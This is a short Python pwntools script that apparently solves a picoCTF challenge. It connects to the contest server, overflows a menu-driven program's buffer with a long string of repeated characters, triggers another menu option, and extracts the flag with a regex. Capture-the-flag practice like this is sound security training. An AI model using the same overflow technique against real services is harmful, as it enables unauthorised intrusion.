#!/usr/bin/env python3

from pwn import *
context.log_level = 'error'

HOST = 'tethys.picoctf.net'
PORT = 64222                     # Change this if needed


def main():
    # Connect to the server
    p = remote(HOST, PORT)

    # Send the payload
    p.sendlineafter(b"choice: ", b"2")
    p.sendlineafter(b"buffer: ", b"222222222222222222222222222222222")
    p.sendlineafter(b"choice: ", b"4")
    
    # Skip not needed lines
    p.recvline()
    p.recvline()

    # Get the correct line
    line = p.recvline().decode('utf-8').strip()
    match = re.search(r'picoCTF\{.*?\}', line)
    if match:
            flag = match.group(0)
            p.close()
            print(flag)
    else:
        p.close()
        print("Flag not found.")


if __name__ == '__main__':
    main()  

